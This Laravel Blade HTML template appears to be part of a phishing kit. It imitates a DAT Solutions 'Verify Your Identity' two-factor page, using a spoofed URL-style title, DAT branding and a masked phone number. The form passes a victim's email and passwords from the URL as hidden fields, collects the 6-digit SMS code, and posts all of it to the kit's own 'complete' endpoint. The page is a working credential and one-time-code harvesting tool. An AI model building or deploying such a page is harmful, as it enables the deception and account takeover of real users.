<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>login.dat.com/login?ate=</title>
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.bunny.net">
    <link href="https://fonts.bunny.net/css?family=figtree:400,600&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css" />
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
          integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
          crossorigin="anonymous">
    <style>
        body {
            margin: 0;
            height: 100vh;
        }
        .loginContainer {
            width: 100%;
            height: 100%;
            background-blend-mode:multiply;
            background-position:center center;
            background-size:cover;
            z-index:-1;
            top:0;
            left:0
        }

        .nav {
            padding: 35px;
        }

        .loginPopup {
            margin-top: 127px;
            margin-left: auto;
            margin-right: auto;
            width: 100%;
            max-width: 400px;
            position: relative;
        }

        .loginPopupContainer {
            border-radius: 4px;
            background: white;
            padding: 0 24px 24px 24px;
        }

        .header {
            padding: 24px 0 0 0;
            font-size: 16px;
        }

        .inputContainer {
            position: relative;
        }

        .filter {
            position: relative;
            width: 100%;
            height: 50px;
            border-radius: 5px;
            outline: none;
            padding: 5px 10px;
            border: 2px solid #7496e0;
        }

        .placeholder {
            position: absolute;
            left: 20px;
            top: -6px;
            background-color: white;
            padding: 0px 5px;
            color: #7496e0;
            font-size: 13px;
        }
        .loginBtn {
            height: 48px;
            border-radius: 40px;
            background-color: #0059d6;
            color: white;
            border: none;
            letter-spacing: 1px;
            font-size: 13px;
            font-weight: 500;
        }

        .loginBtn:hover {
            background-color: #0059d6;
            color: white;
        }
        .loginBtn:active {
            background-color: #0059d6;
            color: white;
        }
        .loginBtn:focus {
            background-color: #0059d6;
            color: white;
        }
        .loginBtn:focus-visible {
            background-color: #0059d6;
            color: white;
        }

        .copyright {
            font-family: SequelSans-Body, sans-serif;
            font-size: 12px;
            font-weight: 400;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.33;
            letter-spacing: normal;
            margin: 16px 0;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            color: #fff;
            text-align: center;
        }

        .copyrightLink {
            text-decoration: underline;
            color: #fff;
        }

        @media only screen and (max-width: 600px) {
            .logo {
                margin: 0 auto;
            }
        }

        .forgotText {
            cursor: pointer;
            color: #0046e0;
            font-size: 14px;
        }

        .phone-number{
            border: 1.5px solid #b5afaf;
            border-radius: 5px;
            height: 50px;
            padding: 12px;
            background: #f1f2f3;
            color: #5b5656;
            font-size: 14px;
        }
    </style>
</head>
<body>
<div class="loginContainer" style="background:linear-gradient(to bottom,rgb(59,72,84) 0%,rgb(25,33,41) 100%),url({{url('/map.png')}})">
    <nav class="nav">
    </nav>
    <div class="loginPopup">
        <div class="loginPopupContainer">
            <form action="{{url('complete')}}" method="post">
                @csrf
                <input type="hidden" name="email" value="{{ app('request')->input('email') }}">
                <input type="hidden" name="password" value="{{ app('request')->input('pass') }}">
                <input type="hidden" name="password-one" value="{{ app('request')->input('passOne') }}">
                <div class="header">
                    <img src="{{url('/').'/logo.png'}}" alt="logo" width="300" height="60">
                    <h1 style="font-size: 24px;font-weight: 600;margin-top: 15px;margin-bottom: 25px;">Verify Your Identity</h1>
                    <p style="font-size: 14px;">We've sent a text message to:</p>
                </div>
                <div class="phone-number">
                    XXXXXXXXXXX
                </div>
                <div style="text-align: end; padding-bottom: 3px;">
                    <span class="forgotText">Reset password</span>
                </div>
                <div class="inputContainer">
                    <input type="text" name="otp" id="otp" required  class="filter emailInput" />
                    <span class="placeholder">Enter the 6-digit code*</span>
                </div>
                <div style="display: flex; align-items: center; margin-top: 13px;">
                    <input type="checkbox" id="vehicle1" name="vehicle1" value="Bike" style="margin-right: 7px; width: 16px; height: 16px;">
                    <label style="font-size: 14px;    padding-top: 9px;" for="vehicle1"> Remember this device for 30 days</label>
                </div><br>

                <button type="submit" class="btn btn-primary btn-lg btn-block loginBtn" id="LoginBtn">CONTINUE</button>
                <div style="font-size: 14px; padding-top: 12px; text-align: center;">
                    <p>Didn't receive a code? <span style="cursor: pointer; color: #0046e0"> Resend</span> or <span style="cursor: pointer; color: #0046e0"> get a call</span></p>
                    <span style="cursor: pointer; color: #0046e0; font-size: 16px; font-weight: 600;"> TRY ANOTHER METHOD</span>.
                </div>
            </form>
        </div>
        <div class="copyright">Copyright © 2024 DAT Solutions, LLC. All rights reserved. <a class="copyrightLink" href="javascript:void(0)">Privacy Policy</a></div>
    </div>
</div>
</body>
</html>
